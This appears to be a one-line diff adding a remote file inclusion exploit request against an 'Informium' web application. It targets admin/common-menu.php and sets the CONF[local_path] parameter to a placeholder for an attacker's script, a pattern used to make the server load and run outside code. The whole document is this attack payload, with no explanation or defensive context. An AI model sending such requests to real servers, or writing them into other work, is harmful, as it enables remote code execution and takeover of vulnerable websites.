@@ -1,0 +1,1 @@
+http://www.example.com/[Informium_path]/admin/common-menu.php?CONF[local_path]=[evil_scripts]
